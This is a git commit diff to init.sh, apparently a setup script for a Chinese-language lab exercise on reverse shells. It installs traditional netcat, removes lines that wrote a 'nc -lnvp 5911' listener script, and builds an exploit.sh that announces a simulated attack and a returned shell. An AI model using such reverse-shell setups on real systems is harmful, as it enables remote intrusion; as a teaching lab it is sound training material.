dc625a99570d6d4a8f4787d966c18cbec98c95f4
Kyle <1106901808@qq.com>
2020-07-03 19:27:14 +0800

    Update init.sh

--- init.sh
+++ init.sh
@@ -2,11 +2,6 @@
 echo "开始部署本章实验环境...";sleep 1
 sudo apt install netcat -y
 sudo rm /etc/alternatives/nc && sudo ln -s /bin/nc.traditional /etc/alternatives/nc
-sudo apt install socat -y
-echo "创建 listen.sh...完成"
-echo "echo '开始监听本地 5911 端口...'" > listen.sh
-echo "nc -lnvp 5911" >> listen.sh
-chmod +x listen.sh
 echo "创建 exploit.sh...完成"
 echo "echo '模拟攻击...'" > exploit.sh
 echo "echo 'shell已反弹完成，请查看 listen.sh 所在终端...'" >> exploit.sh
